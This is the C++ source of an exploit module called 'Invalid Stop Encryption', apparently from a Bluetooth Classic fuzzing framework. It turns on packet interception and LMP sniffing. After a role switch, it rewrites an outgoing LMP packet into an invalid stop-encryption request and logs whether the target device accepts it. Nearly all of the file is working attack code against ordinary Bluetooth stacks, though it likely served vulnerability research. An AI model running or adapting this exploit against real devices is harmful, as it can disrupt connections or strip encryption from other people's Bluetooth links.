#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Setup
static const char *module_name()
{
    return "Invalid Stop Encryption";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 6000;
    config->bluetooth.disable_role_switch = false;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

static uint flag = 0;
static uint rx_counter = 0;

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for LMP_MAX_SLOT
    if (flag && pkt_length >= 4 && IS_LMP_OPCODE(pkt_buf, 45))
    {
        flag = 0;
        pkt_buf[4] = (66 << 1) | 1;
        m_conf_stop_on_crash(p, 1);
        return 1;
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for role switch (FHS from slave)
    if (IS_FHS(pkt_buf))
    {
        flag = 1;
    }
    else if (IS_LMP_OPCODE(pkt_buf, 18))
    {
        rx_counter = 1;
        wd_log_y("[ANOMALY] Invalid Stop Encryption Request Received");
    }

    if (rx_counter && (++rx_counter >= 20))
    {
        rx_counter = 0;
        m_stop(p);
        wd_log_y("[ANOMALY] Invalid Stop Encryption Request Received");
    }
    return 0;
}